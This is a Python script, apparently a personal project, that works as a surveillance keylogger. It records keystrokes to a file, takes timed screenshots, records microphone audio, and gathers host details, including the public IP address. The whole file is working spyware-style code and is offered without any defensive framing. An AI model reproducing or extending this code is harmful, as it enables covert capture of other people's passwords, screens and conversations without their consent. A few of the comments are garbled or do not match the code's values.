from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import time
import datetime
import os
from scipy.io.wavfile import write
import sounddevice as sd
import platform
import socket
from requests import get

keys_information = "key_log.txt"
file_path = "/Users/bhavya_shah/Desktop/Project"
extend = "//"
system_information = "syseminfo.txt"

microphone_time = 10
audio_information = "audio.wav"
output_folder = '/Users/bhavya_shah/Desktop/Project/output_folder'  # Define the output folder  bhavys shah hsso my herp 

if not os.path.exists(output_folder):
    os.makedirs(output_folder)



def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()


def save_screenshot():
    now = datetime.datetime.now()
    screenshot = ImageGrab.grab()
    screenshot.save(os.path.join(output_folder, f'screenshot_{now.strftime("%Y-%m-%d_%H-%M-%S")}.png'))
    print("Screenshot saved!")

print("Auto screenshot capture started...")

interval_between_screenshots = 10  # Define the interval between screenshots in seconds
start_time = time.time()  # Get the current time when the script starts  bhav
duration_to_run = 20  # Duration to run in seconds (e.g., 1 hour) 

def write_file(keys):
    with open(os.path.join(file_path, keys_information), "a") as f:
        for key in keys:
            k = str(key)
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
def on_press(key):
    global keys, count

    if key == Key.esc:
        return False

    print(key)
    keys.append(key)
    count += 1
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

count = 0
keys = []

def on_release(key):
    if key == Key.esc:
        return False

# Start the listener to monitor keystrokes bhavys 
with Listener(on_press=on_press, on_release=on_release) as listener:
    while time.time() - start_time <= duration_to_run:
        computer_information()
        save_screenshot()
        microphone()
        time.sleep(interval_between_screenshots)

    listener.stop()  
    listener.join() 
